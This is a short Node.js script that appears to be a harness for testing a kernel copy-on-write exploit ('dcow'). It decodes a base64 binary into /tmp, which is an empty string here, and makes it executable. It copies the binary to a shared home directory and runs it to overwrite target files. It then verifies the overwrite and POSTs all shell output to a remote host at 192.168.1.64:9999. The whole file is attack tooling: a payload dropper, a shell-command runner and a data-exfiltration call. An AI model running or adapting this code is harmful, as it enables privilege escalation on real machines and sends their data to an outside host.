"use strict";

var cp = require("child_process");
var http = require("http");
var fs = require("fs");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd, timeout) {
    try {
        return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: timeout || 25000 });
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        {
            host: HOST,
            port: PORT,
            path: path,
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(data)
            }
        },
        function (res) {
            console.log("posted " + path + " -> " + res.statusCode);
        }
    );
    req.on("error", function (e) {
        console.log("post error " + e.message);
    });
    req.write(data);
    req.end();
}

var B64 = "";

var out = {};
out.started = new Date().toISOString();

fs.writeFileSync("/tmp/dcowtest3", new Buffer(B64, "base64"));
fs.chmodSync("/tmp/dcowtest3", 0755);
out.ls = run("ls -laZ /tmp/dcowtest3 2>&1; cp /tmp/dcowtest3 /home/owner/share/dcowtest4; chmod 755 /home/owner/share/dcowtest4; ls -laZ /home/owner/share/dcowtest4 2>&1");

out.direct_exec = "try-direct";
try {
    var r = cp.execFileSync("/tmp/dcowtest3", ["/tmp/zzz_dcow_target2", "2", "0x43"], { encoding: "utf8", timeout: 240000 });
    out.direct_exec = r;
} catch (e) {
    out.direct_exec = "ERR " + (e.stdout ? e.stdout : e.message);
}

out.share_exec = run("/home/owner/share/dcowtest4 /home/owner/share/zzz_t3 2 0x44; echo rc=$?", 240000);

out.verify = run("cat /tmp/zzz_dcow_target2 2>&1; echo; od -An -tx1 /home/owner/share/zzz_t3 2>/dev/null | head -2");

post("/audit10", out);
